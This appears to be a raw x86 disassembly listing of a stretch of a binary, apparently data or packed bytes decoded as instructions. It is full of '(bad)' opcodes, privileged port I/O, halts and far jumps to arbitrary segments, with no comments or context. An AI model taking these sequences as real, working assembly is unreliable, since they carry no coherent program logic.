  41aec3:	jp     0x41aec1
  41aec5:	into   
  41aec6:	loope  0x41af27
  41aec8:	and    eax,0x2a6aaf3
  41aecd:	sub    DWORD PTR [esi+0x5ba5db28],edi
  41aed3:	fmul   DWORD PTR [ecx-0x5f42653c]
  41aed9:	adc    eax,0x3deea56d
  41aede:	(bad)  
  41aedf:	xchg   esp,eax
  41aee0:	test   BYTE PTR [esi-0x29],cl
  41aee3:	pusha  
  41aee4:	mov    ss,WORD PTR [esi-0x4d766c84]
  41aeea:	xor    DWORD PTR [eax],ebx
  41aeec:	ja     0x41af2b
  41aeee:	mov    bl,0x84
  41aef0:	and    DWORD PTR [ecx-0x5b],ecx
  41aef3:	pop    ds
  41aef4:	pushf  
  41aef5:	mov    bl,0x8a
  41aef7:	pop    eax
  41aef8:	nop
  41aef9:	lock fwait
  41aefb:	dec    ebx
  41aefc:	add    eax,0x4204e5f6
  41af01:	call   0xa9ae:0x943c61d7
  41af08:	push   ebp
  41af09:	xor    eax,0x2ff674b9
  41af0e:	(bad)  
  41af10:	push   ss
  41af11:	mov    esi,0xd89717d2
  41af16:	push   0xc9240833
  41af1b:	cmp    al,0x1f
  41af1d:	cdq    
  41af1e:	test   esp,edx
  41af20:	aas    
  41af21:	dec    eax
  41af22:	popa   
  41af23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af24:	add    al,0x25
  41af26:	(bad)  
  41af27:	daa    
  41af28:	cmp    eax,0xc89bfba8
  41af2d:	inc    ecx
  41af2e:	jecxz  0x41aee9
  41af30:	add    al,0x31
  41af32:	xchg   ebx,eax
  41af33:	cwde   
  41af34:	sar    DWORD PTR [edx+0x509144b5],cl
  41af3a:	add    esp,edx
  41af3c:	test   DWORD PTR [ebp-0x6c6c3055],esi
  41af42:	mov    ecx,0x23a90c33
  41af47:	pop    edx
  41af48:	(bad)  
  41af49:	sti    
  41af4a:	fisttp QWORD PTR [ebx-0x3c]
  41af4d:	sbb    eax,0xe7388397
  41af52:	(bad)  
  41af53:	shl    BYTE PTR [ebp-0x1c],1
  41af56:	icebp  
  41af57:	in     eax,0x57
  41af59:	stos   DWORD PTR es:[edi],eax
  41af5a:	add    edx,DWORD PTR [edi]
  41af5c:	sbb    DWORD PTR [esp+edi*4+0x24],edi
  41af60:	mov    bl,0x5a
  41af62:	fsub   st,st(0)
  41af64:	add    eax,0x92e96a61
  41af69:	add    BYTE PTR [eax-0x62332945],cl
  41af6f:	inc    edx
  41af70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af71:	inc    esp
  41af72:	imul   esi,ecx,0xd57ef1be
  41af78:	in     eax,0xd1
  41af7a:	out    0xe5,eax
  41af7c:	jg     0x41af44
  41af7e:	sbb    ebp,DWORD PTR [edx-0x2038e825]
  41af84:	mov    ecx,0xf0e4b7be
  41af89:	addr16 repnz mov ds:0x2dc5,eax
  41af8e:	jmp    0x41af83
  41af90:	or     BYTE PTR [si+0x585f],ah
  41af95:	mov    BYTE PTR [eax],bh
  41af97:	mov    al,0x25
  41af99:	and    eax,0x206ec4e8
  41af9e:	inc    edi
  41af9f:	add    DWORD PTR [eax+0x259eab9f],0x50
  41afa6:	cmp    ch,dh
  41afa8:	mov    ah,0x2e
  41afaa:	ja     0x41af56
  41afac:	jmp    0xc41665c4
  41afb1:	xor    eax,DWORD PTR [ebx+eiz*4-0xb]
  41afb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb6:	or     al,0xe7
  41afb8:	sub    DWORD PTR [esi-0x15],0xffffffbb
  41afbc:	pop    ds
  41afbd:	jmp    0xe0adf716
  41afc2:	xchg   BYTE PTR [ebx+0x29],dl
  41afc5:	fwait
  41afc6:	jnp    0x41af7e
  41afc8:	sbb    DWORD PTR [edx-0x15ad0e78],edi
  41afce:	dec    ecx
  41afcf:	stc    
  41afd0:	lods   al,BYTE PTR ds:[esi]
  41afd1:	pushf  
  41afd2:	or     DWORD PTR [eax],0x70
  41afd5:	mov    WORD PTR [esi+0x4c],ds
  41afd8:	repz popf 
  41afda:	imul   ebx,DWORD PTR [ebp+0x363184cf],0xfffffffb
  41afe1:	mov    eax,ds:0xb93e6b20
  41afe6:	mov    eax,0x3092c884
  41afeb:	test   DWORD PTR ds:0x55f3e55f,edx
  41aff1:	and    esi,0xffffffff
  41aff4:	es jns 0x41af79
  41aff7:	jp     0x41afeb
  41aff9:	rol    DWORD PTR [ebx-0x48581f19],1
  41afff:	add    esi,DWORD PTR ds:0x5ef09983
  41b005:	cmp    al,0xe2
  41b007:	and    eax,0xac37b916
  41b00c:	test   al,0x71
  41b00e:	outs   dx,DWORD PTR ds:[esi]
  41b00f:	pop    esp
  41b010:	mov    esp,DWORD PTR [edx-0x66975895]
  41b016:	push   ds
  41b017:	or     ebx,ebx
  41b019:	clc    
  41b01a:	hlt    
  41b01b:	jl     0x41b03b
  41b01d:	test   eax,0xb3b96fb6
  41b022:	in     al,dx
  41b023:	dec    edx
  41b024:	dec    esp
  41b025:	mov    ds:0x3bd486bb,al
  41b02a:	adc    eax,0xd79536b
  41b02f:	mov    al,ds:0x44b2af01
  41b034:	stos   DWORD PTR es:[edi],eax
  41b035:	sbb    dl,BYTE PTR [ecx]
  41b037:	mov    BYTE PTR [edi],ah
  41b039:	jle    0x41aff5
  41b03b:	rcr    BYTE PTR [ebp+0x58f30c42],1
  41b041:	mov    edx,0xfb7fb436
  41b046:	mov    esp,0x6b61c54
  41b04b:	inc    eax
  41b04c:	out    0xde,al
  41b04e:	leave  
  41b04f:	push   eax
  41b050:	gs jecxz 0x41b051
  41b053:	sub    BYTE PTR [edx],bh
  41b055:	xchg   DWORD PTR [bp+0x6f0c],eax
  41b05a:	mov    esi,0xdb9edc70
  41b05f:	ror    BYTE PTR [ecx],1
  41b061:	pop    esi
  41b062:	arpl   di,cx
  41b064:	push   esp
  41b065:	mov    ch,0x7d
  41b067:	sub    esp,DWORD PTR [ecx]
  41b069:	adc    DWORD PTR [edx+0x3325ba64],esi
  41b06f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b071:	push   edx
  41b072:	add    esp,DWORD PTR [esi]
  41b074:	pop    edx
  41b075:	test   al,0xa3
  41b077:	aam    0x26
  41b079:	and    DWORD PTR [edi],ebx
  41b07b:	and    esi,ecx
  41b07d:	pop    edx
  41b07e:	mov    ebp,0x7e20b874
  41b083:	mov    bh,0x85
  41b085:	pop    esi
  41b086:	scas   eax,DWORD PTR es:[edi]
  41b087:	out    dx,eax
  41b088:	inc    eax
  41b089:	mov    al,ds:0x191d6aea
  41b08e:	in     eax,0xb1
  41b090:	push   ebx
  41b091:	dec    ebp
  41b092:	dec    esi
  41b093:	jbe    0x41b0aa
  41b095:	mov    ds:0x536c9e7b,al
  41b09a:	mov    eax,ds:0xae76e02e
  41b09f:	pop    edi
  41b0a0:	dec    eax
  41b0a1:	stos   DWORD PTR es:[edi],eax
  41b0a2:	shld   DWORD PTR [eax],esp,cl
  41b0a5:	xchg   ecx,eax
  41b0a6:	pusha  
  41b0a7:	in     eax,dx
  41b0a8:	xchg   ebp,eax
  41b0a9:	mov    ds:0x31a4308b,al
  41b0ae:	xchg   edi,eax
  41b0af:	in     eax,0x3b
  41b0b1:	scas   eax,DWORD PTR es:[edi]
  41b0b2:	pop    edx
  41b0b3:	adc    ecx,DWORD PTR [ecx]
  41b0b5:	xor    al,0x7f
  41b0b7:	cdq    
  41b0b8:	mov    esi,0xefe2490f
  41b0bd:	xor    esi,edi
  41b0bf:	jmp    0x54adc1ae
  41b0c4:	div    BYTE PTR [edi+0x23b6d987]
  41b0ca:	jns    0x41b0f0
  41b0cc:	stos   DWORD PTR es:[edi],eax
  41b0cd:	in     al,0x34
  41b0cf:	popf   
  41b0d0:	ss stos DWORD PTR es:[edi],eax
  41b0d2:	mov    cl,0x24
  41b0d4:	fwait
  41b0d5:	xor    al,0xf5
  41b0d7:	xor    ax,0xd996
  41b0db:	in     al,dx
  41b0dc:	test   DWORD PTR [edi+ebp*1-0x41e6d43b],esi
  41b0e3:	mov    edi,ebx
  41b0e5:	ja     0x41b12b
  41b0e7:	push   ebx
  41b0e8:	pop    ss
  41b0e9:	fwait
  41b0ea:	cdq    
  41b0eb:	pushf  
  41b0ec:	push   ebp
  41b0ed:	fs shl edi,0xad
  41b0f1:	mov    bh,BYTE PTR [edi]
  41b0f3:	jp     0x41b111
  41b0f5:	cdq    
  41b0f6:	das    
  41b0f7:	mov    esi,0x33ced119
  41b0fc:	cmp    BYTE PTR [edx+0xc],0xdc
  41b100:	pusha  
  41b101:	cmp    BYTE PTR [ebx],dh
  41b103:	out    0x94,eax
  41b105:	mov    ch,ah
  41b107:	je     0x41b0dc
  41b109:	daa    
  41b10a:	mov    ebp,0xb6567df1
  41b10f:	aam    0x2a
  41b111:	sbb    BYTE PTR [edi-0x219968c0],al
  41b117:	lods   al,BYTE PTR ds:[esi]
  41b118:	cmp    DWORD PTR [esi+0x12],0xdc77a7f0
  41b11f:	shl    BYTE PTR [edx+0x7c],cl
  41b122:	out    dx,eax
  41b123:	push   esp
  41b124:	add    al,0x1c
  41b126:	fwait
  41b127:	mov    DWORD PTR [edi],edi
  41b129:	sbb    DWORD PTR [ebx-0x59],eax
  41b12c:	mov    ch,0xd0
  41b12e:	jge    0x41b123
  41b130:	dec    edx
  41b131:	mov    ah,0x8
  41b133:	mov    esi,0x1937e919
  41b138:	stc    
  41b139:	and    DWORD PTR [esi],0x7dfdcc93
  41b13f:	lock mov ds:0xc608fb9a,al
  41b145:	arpl   WORD PTR [ebx+0x58591fc5],di
  41b14b:	mov    esp,0xb9d5e780
  41b150:	clc    
  41b151:	and    eax,0x7336d55b
  41b156:	sbb    BYTE PTR [eax],0x6b
  41b159:	jbe    0x41b11e
  41b15b:	mov    dl,0xc1
  41b15d:	add    dh,ch
  41b15f:	out    dx,al
  41b160:	sbb    al,0x99
  41b162:	icebp  
  41b163:	xchg   esp,eax
  41b164:	push   esp
  41b165:	cwde   
  41b166:	ds int3 
  41b168:	nop
  41b169:	popf   
  41b16a:	or     ebx,DWORD PTR [eax+eiz*8]
  41b16d:	mov    ss,WORD PTR [ecx+0x3dbf9ef0]
  41b173:	rol    BYTE PTR [ecx],cl
  41b175:	dec    ebx
  41b176:	dec    ebx
  41b177:	fcomp  QWORD PTR [edi]
  41b179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b17a:	ret    
  41b17b:	fcomi  st,st(3)
  41b17d:	sub    BYTE PTR [eax+0x7efdf5c5],0xf2
  41b184:	mov    gs,WORD PTR [ebp+0x7c]
  41b187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b188:	and    cl,BYTE PTR [ecx]
  41b18a:	inc    esi
  41b18b:	out    0x7c,eax
  41b18d:	aad    0xbf
  41b18f:	mov    al,0xdd
  41b191:	out    0xdc,eax
  41b193:	in     eax,0xf6
  41b195:	pop    edx
  41b196:	xlat   BYTE PTR ds:[ebx]
  41b197:	jecxz  0x41b18d
  41b199:	sar    BYTE PTR [ebp+0x48b9d3e4],cl
  41b19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1a0:	retf   0xb91d
  41b1a3:	in     al,0xd2
  41b1a5:	outs   dx,DWORD PTR ds:[esi]
  41b1a6:	(bad)  
  41b1a7:	test   eax,0x5eebae86
  41b1ac:	adc    DWORD PTR [ebp+0x2ab789ce],esp
  41b1b2:	jnp    0x41b1ca
  41b1b4:	cmc    
  41b1b5:	sahf   
  41b1b6:	xchg   esi,eax
  41b1b7:	and    eax,0xf8f0d281
  41b1bc:	fiadd  DWORD PTR [edi]
  41b1be:	adc    al,0x8
  41b1c0:	adc    eax,0xb6ee4e5d
  41b1c5:	(bad)  
  41b1c6:	adc    al,0xc1
  41b1c8:	mov    BYTE PTR [ecx],ch
  41b1ca:	(bad)  
  41b1cb:	nop
  41b1cc:	js     0x41b1d2
  41b1ce:	dec    ecx
  41b1cf:	push   es
  41b1d0:	push   ebx
  41b1d1:	and    eax,0x1f26ddb3
  41b1d6:	mov    ah,BYTE PTR [ebx]
  41b1d8:	ins    BYTE PTR es:[edi],dx
  41b1d9:	adc    DWORD PTR [eax],eax
  41b1db:	cmp    dl,BYTE PTR [esi+0x11a0b82f]
  41b1e1:	shl    DWORD PTR [edi],1
  41b1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1e4:	inc    edi
  41b1e5:	scas   al,BYTE PTR es:[edi]
  41b1e6:	mov    dh,0xd4
  41b1e8:	dec    esp
  41b1e9:	ret    
  41b1ea:	or     DWORD PTR [ecx],ebp
  41b1ec:	inc    ebp
  41b1ed:	(bad)  
  41b1ee:	(bad)  
  41b1ef:	in     al,dx
  41b1f0:	or     dh,BYTE PTR [ebx]
  41b1f2:	dec    ebx
  41b1f3:	sbb    DWORD PTR [ecx],ebx
  41b1f5:	test   eax,0x50b0a5dc
  41b1fa:	lea    edx,[ecx+esi*1]
  41b1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1fe:	fwait
  41b1ff:	jbe    0x41b1e7
  41b201:	fmul   st(6),st
  41b203:	inc    ecx
  41b204:	retf   
  41b205:	cwde   
  41b206:	pushf  
  41b207:	and    eax,0x75265138
  41b20c:	add    DWORD PTR [ecx-0x6e43e389],ebp
  41b212:	sbb    ebp,DWORD PTR ds:0x44f0ae67
  41b218:	push   ebp
  41b219:	dec    esi
  41b21a:	sub    cl,ch
  41b21c:	daa    
  41b21d:	aad    0xe9
  41b21f:	mov    edx,0x85693228
  41b224:	jge    0x41b21b
  41b226:	iret   
  41b227:	out    dx,eax
  41b228:	pop    edx
  41b229:	fs dec ebp
  41b22b:	xchg   bh,bl
  41b22d:	lahf   
  41b22e:	fwait
  41b22f:	ds or  eax,0xb80a61d0
  41b235:	mov    bh,0x74
  41b237:	mov    esi,0xf855944a
  41b23c:	not    DWORD PTR [ebp-0x66cfd6d6]
  41b242:	fistp  DWORD PTR [edx+0x4f019302]
  41b248:	push   ebp
  41b249:	lods   eax,DWORD PTR ds:[esi]
  41b24a:	mov    edi,gs
  41b24c:	add    esi,ecx
  41b24e:	shl    BYTE PTR [ebp-0x258f1652],1
  41b254:	push   edi
  41b255:	mov    al,ds:0xa9bfdff3
  41b25a:	dec    esi
  41b25b:	mov    esi,0xf35b8f15
  41b260:	pushf  
  41b261:	adc    bh,0xd8
  41b264:	and    cl,BYTE PTR [ecx]
  41b266:	mov    ds:0x5105a22e,al
  41b26b:	mov    ecx,esp
  41b26d:	cdq    
  41b26e:	fwait
  41b26f:	ins    DWORD PTR es:[edi],dx
  41b270:	pop    ebx
  41b271:	add    dl,BYTE PTR [edi+ebx*1]
  41b274:	xchg   esp,eax
  41b275:	push   esp
  41b276:	and    ah,BYTE PTR ds:0x44be5133
  41b27c:	sub    eax,0x9558671d
  41b281:	mul    DWORD PTR [edx+ebp*8]
  41b284:	or     esp,DWORD PTR [esi+0x10]
  41b287:	jne    0x41b2a0
  41b289:	mov    DWORD PTR [ebp+0x22],ebx
  41b28c:	add    DWORD PTR [eax],ecx
  41b28e:	mov    BYTE PTR [esi],dl
  41b290:	mov    WORD PTR [esi-0x7e4da9e5],fs
  41b296:	mov    ecx,DWORD PTR [edx-0x60cc4c43]
  41b29c:	fsub   DWORD PTR [edx+0x4c1cc4c4]
  41b2a2:	cmp    BYTE PTR [ebp+0x323b9a27],bh
  41b2a8:	mov    edi,0x83e9bd89
  41b2ad:	mov    dh,0xa
  41b2af:	sbb    BYTE PTR [edx],bl
  41b2b1:	xchg   edi,eax
  41b2b2:	mov    edx,0xdffcb864
  41b2b7:	xchg   BYTE PTR [edi+0x56a54d3c],dl
  41b2bd:	loope  0x41b247
  41b2bf:	push   ss
  41b2c0:	sbb    al,0x73
  41b2c2:	sub    BYTE PTR [ecx],al
  41b2c4:	adc    eax,0x43ff7c89
  41b2c9:	fidiv  DWORD PTR [edi]
  41b2cb:	popf   
  41b2cc:	jmp    0x44a13f53
  41b2d1:	cwde   
  41b2d2:	mov    ds:0xbce28f2e,al
  41b2d7:	or     al,0x20
  41b2d9:	or     DWORD PTR [ebp-0x513ce3de],ebx
  41b2df:	pop    ss
  41b2e0:	jnp    0x41b2df
  41b2e2:	cmp    DWORD PTR [edx-0x11a7998b],ebx
  41b2e8:	hlt    
  41b2e9:	cmp    eax,0x69188d82
  41b2ee:	cdq    
  41b2ef:	(bad)  
  41b2f1:	xchg   esi,eax
  41b2f2:	inc    esi
  41b2f3:	pop    esp
  41b2f4:	in     eax,dx
  41b2f5:	cdq    
  41b2f6:	retf   
  41b2f7:	add    BYTE PTR [eax],ch
  41b2f9:	inc    ecx
  41b2fa:	push   ecx
  41b2fb:	mov    ss,ecx
  41b2fd:	adc    al,bh
  41b2ff:	arpl   WORD PTR [ecx-0x5c],ax
  41b302:	imul   ecx,DWORD PTR [eax-0x5b],0x4b
  41b306:	jnp    0x41b32c
  41b308:	dec    ecx
  41b309:	popf   
  41b30a:	retf   
  41b30b:	mov    cl,0x71
  41b30d:	push   0x213cfc90
  41b312:	mov    edi,0xab5ff2aa
  41b317:	in     eax,0x1f
  41b319:	xor    DWORD PTR [ebp-0x37],ebx
  41b31c:	dec    ecx
  41b31d:	dec    ebx
  41b31e:	cmp    edi,DWORD PTR [ecx+0x7]
  41b321:	js     0x41b2de
  41b323:	scas   eax,DWORD PTR es:[edi]
  41b324:	sub    DWORD PTR [edi],ecx
  41b326:	shr    ah,0x3c
  41b329:	inc    edi
  41b32a:	repnz icebp 
  41b32c:	sbb    DWORD PTR [ebp-0x58],0xffffffb5
  41b330:	(bad)  
  41b332:	outs   dx,BYTE PTR ds:[esi]
  41b333:	cld    
  41b334:	push   ds
  41b335:	or     BYTE PTR [edi],dh
  41b337:	pop    ds
  41b338:	test   DWORD PTR [ebp+edx*2-0xf],esp
  41b33c:	add    ecx,esi
  41b33e:	mov    ecx,0x32e99157
  41b343:	loop   0x41b353
  41b345:	pop    ss
  41b346:	and    esp,DWORD PTR [edi+0x29]
  41b349:	jb     0x41b317
  41b34b:	or     ch,BYTE PTR [edx+0x2cb33ba1]
  41b351:	mov    ebp,0x3ed3834f
  41b356:	addr16 mov eax,0x84be05b4
  41b35c:	adc    eax,0x76b221eb
  41b361:	inc    ebp
  41b362:	add    eax,0xd7d8bf62
  41b367:	pusha  
  41b368:	push   ebp
  41b369:	add    edi,DWORD PTR [ecx+ebp*1]
  41b36c:	adc    ecx,0x16ed83b8
  41b372:	enter  0xb0d4,0xa8
  41b376:	sub    DWORD PTR [esi+0x3d],0x9d20bba4
  41b37d:	mov    dh,0x9c
  41b37f:	jbe    0x41b3f5
  41b381:	cld    
  41b382:	fnstenv [edi+0x4e]
  41b385:	xchg   edx,eax
  41b386:	mov    ebx,0xc30b1a54
  41b38b:	imul   eax,DWORD PTR [ebp+0x58],0xffffffce
  41b38f:	out    0x2d,eax
  41b391:	push   es
  41b392:	mov    ch,0xd7
  41b394:	pop    ss
  41b395:	imul   edx,DWORD PTR [ebx-0x79],0xfc7f519
  41b39c:	fistp  WORD PTR [ebp+0x3e18c59b]
  41b3a2:	js     0x41b369
  41b3a4:	scas   eax,DWORD PTR es:[edi]
  41b3a5:	fsubr  st(4),st
  41b3a7:	mov    al,0x0
  41b3a9:	mov    ch,0xb4
  41b3ab:	fs xor eax,0x69954319
  41b3b1:	div    dh
  41b3b3:	fcom   QWORD PTR [ebp+0x22]
  41b3b6:	mov    ebp,0xa99a357c
  41b3bb:	pop    edi
  41b3bc:	enter  0xf229,0xc4
  41b3c0:	sbb    DWORD PTR [ebp-0x5157e628],edx
  41b3c6:	jmp    0x41b426
  41b3c8:	cmp    esi,DWORD PTR [edi-0x602f7461]
  41b3ce:	add    al,BYTE PTR ds:0x99bb2943
  41b3d4:	jbe    0x41b363
  41b3d6:	sub    DWORD PTR [ebx+ecx*4-0x50f514a],ebx
  41b3dd:	(bad)  
  41b3de:	fldl2e 
  41b3e0:	in     eax,0x59
  41b3e2:	push   ebx
  41b3e3:	lock js 0x41b44e
  41b3e6:	int    0x2c
  41b3e8:	and    al,0x9
  41b3ea:	or     eax,0xd194e733
  41b3ef:	and    al,ah
  41b3f1:	sahf   
  41b3f2:	imul   ebp,DWORD PTR [eax-0x24],0xffffffa9
  41b3f6:	ja     0x41b45a
  41b3f8:	mov    bl,0xfc
  41b3fa:	pop    edi
  41b3fb:	adc    eax,edx
  41b3fd:	test   al,0xb9
  41b3ff:	push   esp
  41b400:	test   al,0x47
  41b402:	(bad)  
  41b404:	and    eax,0x9ff03e0a
  41b409:	ins    DWORD PTR es:[edi],dx
  41b40a:	jmp    0x280b:0x32091dec
  41b411:	jnp    0x41b3dd
  41b413:	ins    DWORD PTR es:[edi],dx
  41b414:	les    ebx,FWORD PTR [edx-0x766db7a5]
  41b41a:	pusha  
  41b41b:	xor    ch,BYTE PTR [edx]
  41b41d:	adc    cl,cl
  41b41f:	pusha  
  41b420:	sbb    BYTE PTR [edx+0x6bd724b5],dl
  41b426:	jo     0x41b43c
  41b428:	neg    BYTE PTR [esp+ecx*2]
  41b42b:	push   edi
  41b42c:	pop    ebp
  41b42d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b42e:	call   0x563b:0x90665b42
  41b435:	mov    ah,0xc8
  41b437:	je     0x41b407
  41b439:	shr    bl,1
  41b43b:	test   eax,0x28bc6ce4
  41b440:	push   es
  41b441:	(bad)  
  41b442:	xchg   ebx,eax
  41b443:	adc    eax,0xc0aca3be
  41b448:	leave  
  41b449:	imul   esi,DWORD PTR [ebx],0xa229974e
  41b44f:	ss inc ebp
  41b451:	shl    DWORD PTR [ebx-0x26e6932f],1
  41b457:	inc    edx
  41b458:	xlat   BYTE PTR ds:[ebx]
  41b459:	call   0x2be9:0x8d2cbc7b
  41b460:	cwde   
  41b461:	jae    0x41b4d3
  41b463:	adc    al,0x4
  41b465:	push   0x6c
  41b467:	pop    esp
  41b468:	ins    DWORD PTR es:[edi],dx
  41b469:	mov    ds:0x27aaf607,eax
  41b46e:	adc    eax,0xf904d7f3
  41b473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b474:	aad    0xd
  41b476:	and    al,0xe5
  41b478:	xchg   BYTE PTR [ebx-0x2ce5e4fa],dh
  41b47e:	mov    eax,0x16dc92f4
  41b483:	jns    0x41b46a
  41b485:	rcr    DWORD PTR [esi-0x18],cl
  41b488:	jae    0x41b505
  41b48a:	and    DWORD PTR [esi+0x54c6ca11],esi
  41b490:	ret    0x73a8
  41b493:	loop   0x41b4f3
  41b495:	stos   BYTE PTR es:[edi],al
  41b496:	inc    ebp
  41b497:	jmp    0x6722:0xdc2c9736
  41b49e:	outs   dx,DWORD PTR ds:[esi]
  41b49f:	daa    
  41b4a0:	or     cl,BYTE PTR [edi-0x3dd7d6d2]
  41b4a6:	and    eax,DWORD PTR ds:0xca98bf1f
  41b4ac:	sbb    eax,0x99d57a66
  41b4b1:	lock xchg esi,eax
  41b4b3:	ins    DWORD PTR es:[edi],dx
  41b4b4:	call   0x497f4ba1
  41b4b9:	adc    al,0xbd
  41b4bb:	test   BYTE PTR [edx+0x56d6b3f9],dh
  41b4c1:	rcr    BYTE PTR [ebx],cl
  41b4c3:	sbb    al,0xe5
  41b4c5:	and    BYTE PTR [edx+0x49],cl
  41b4c8:	adc    ah,BYTE PTR [edx+0x18f5a8a9]
  41b4ce:	dec    esp
  41b4cf:	in     al,dx
  41b4d0:	xor    edi,DWORD PTR [edi]
  41b4d2:	(bad)  
  41b4d4:	and    ebx,DWORD PTR [ecx]
  41b4d6:	stc    
  41b4d7:	jnp    0x41b4ba
  41b4d9:	push   cs
  41b4da:	pop    edi
  41b4db:	xchg   edx,eax
  41b4dc:	aaa    
  41b4dd:	mov    ds:0x5278190b,al
  41b4e2:	xchg   ebx,eax
  41b4e3:	das    
  41b4e4:	clc    
  41b4e5:	scas   al,BYTE PTR es:[edi]
  41b4e6:	es adc ch,al
  41b4e9:	pop    ebp
  41b4ea:	aad    0xd4
  41b4ec:	pop    edx
  41b4ed:	or     al,0xa1
  41b4ef:	test   ebx,esp
  41b4f1:	push   ebp
  41b4f2:	mov    edi,0xb38bcec0
  41b4f7:	hlt    
  41b4f8:	xchg   esp,eax
  41b4f9:	xor    al,0x49
  41b4fb:	jnp    0x41b52a
  41b4fd:	jae    0x41b51c
  41b4ff:	push   ebp
  41b500:	push   ss
  41b501:	mov    ds:0x470aed97,eax
  41b506:	sub    eax,0x8ba9196a
  41b50b:	adc    esp,DWORD PTR [edi-0x6e18d41f]
  41b511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b512:	sbb    edx,eax
  41b514:	xchg   edi,eax
  41b515:	scas   eax,DWORD PTR es:[edi]
  41b516:	jns    0x41b4de
  41b518:	add    al,0xdd
  41b51a:	aam    0x2e
  41b51c:	les    ebp,FWORD PTR ds:0xfe2344ba
  41b522:	cli    
  41b523:	push   edi
  41b524:	xchg   esp,ecx
  41b526:	xor    ecx,esp
  41b528:	mov    ebp,0x1ee50f3a
  41b52d:	dec    edx
  41b52e:	test   DWORD PTR [esi-0x4a],0x5054b93e
  41b535:	jbe    0x41b508
  41b537:	mov    edi,0xe78fac45
  41b53c:	mov    ebx,0x65ed8412
  41b541:	ficomp DWORD PTR [ecx+0xbd3a279]
  41b547:	loop   0x41b58c
  41b549:	jae    0x41b50c
  41b54b:	pop    esi
  41b54c:	push   eax
  41b54d:	sbb    eax,0x3165e7bc
  41b552:	push   edx
  41b553:	out    dx,al
  41b554:	sub    al,0x1e
  41b556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b557:	dec    edi
  41b558:	and    BYTE PTR [ecx],bh
  41b55a:	lea    edx,[ebp+0x3da17c7c]
  41b560:	sti    
  41b561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b562:	pop    ebx
  41b563:	pop    edx
  41b564:	pavgb  mm7,mm2
  41b567:	adc    al,0x81
  41b569:	test   al,0xa8
  41b56b:	push   0xe4b66fd8
  41b570:	mov    al,ds:0xd590efba
  41b575:	inc    ecx
  41b576:	push   ds
  41b577:	repnz btr edx,ebp
  41b57b:	dec    ebx
  41b57c:	fs imul edx,eax,0x42733ad5
  41b583:	inc    ebx
  41b584:	fs ds mov bh,0x1c
  41b588:	push   esi
  41b589:	inc    esi
  41b58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b58b:	bound  ecx,QWORD PTR [eax-0x38]
  41b58e:	or     ebp,ebp
  41b590:	sbb    BYTE PTR [ebp-0x46e7ac93],cl
  41b596:	sbb    dl,cl
  41b598:	loop   0x41b51d
  41b59a:	and    al,0xa1
  41b59c:	push   ss
  41b59d:	in     al,0xca
  41b59f:	push   cs
  41b5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5a1:	xlat   BYTE PTR ds:[ebx]
  41b5a2:	xor    eax,0xfaaf1fc8
  41b5a7:	enter  0xb8cb,0x83
  41b5ab:	in     al,0x6e
  41b5ad:	(bad)  
  41b5ae:	iret   
  41b5af:	in     al,0xb1
  41b5b1:	mov    ds:0xa28585d9,eax
  41b5b6:	jnp    0x41b59c
  41b5b8:	popa   
  41b5b9:	or     ch,0xb2
  41b5bc:	cmp    al,0xa7
  41b5be:	les    edi,FWORD PTR [eax+0x21]
  41b5c1:	mov    esp,esi
  41b5c3:	mov    ds:0x9ae624be,eax
  41b5c8:	ror    DWORD PTR [esi],1
  41b5ca:	fdiv   QWORD PTR [esi+edx*4]
  41b5cd:	mov    ah,0xcb
  41b5cf:	push   ebp
  41b5d0:	into   
  41b5d1:	test   al,0xc1
  41b5d3:	pusha  
  41b5d4:	(bad)  
  41b5d5:	cmp    al,0x33
  41b5d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5d8:	jmp    DWORD PTR [edi]
  41b5da:	mov    edx,0x525b09c4
  41b5df:	xchg   ecx,eax
  41b5e0:	inc    esi
  41b5e1:	mov    ebp,0xa22f5b46
  41b5e6:	ror    DWORD PTR [edx-0x49b720fe],cl
  41b5ec:	push   ss
  41b5ed:	sbb    DWORD PTR [esi],edi
  41b5ef:	lock imul DWORD PTR [eax]
  41b5f2:	mov    bl,0x3b
  41b5f4:	fmul   QWORD PTR [ebp*1+0x6ba30c7e]
  41b5fb:	inc    ebp
  41b5fc:	inc    ecx
  41b5fd:	sbb    edi,ebp
  41b5ff:	jmp    0x41b618
  41b601:	dec    ecx
  41b602:	loopne 0x41b58a
  41b604:	je     0x41b60e
  41b606:	dec    esi
  41b607:	jo     0x41b5b3
  41b609:	sahf   
  41b60a:	pop    ebx
  41b60b:	pop    ebx
  41b60c:	pushf  
  41b60d:	mov    al,ds:0x178acd6c
  41b612:	jecxz  0x41b5e3
  41b614:	pop    ds
  41b615:	mov    bh,0x3d
  41b617:	hlt    
  41b618:	jg     0x41b5e9
  41b61a:	and    eax,0xea413e26
  41b61f:	add    al,0x5e
  41b621:	pop    eax
  41b622:	dec    edx
  41b623:	in     eax,dx
  41b624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b625:	ror    BYTE PTR [edi-0x16],0x4b
  41b629:	cli    
  41b62a:	addr16 inc ecx
  41b62c:	rcr    esp,cl
  41b62e:	ss jg  0x41b616
  41b631:	sbb    DWORD PTR [edi+0x701f1ff0],edi
  41b637:	push   ecx
  41b638:	xor    eax,0xdae59c32
  41b63d:	sub    ch,BYTE PTR [ecx]
  41b63f:	hlt    
  41b640:	out    0x2a,al
  41b642:	(bad)  
  41b643:	addr16 inc edi
  41b645:	jge    0x41b65a
  41b647:	jmp    0x41b6c8
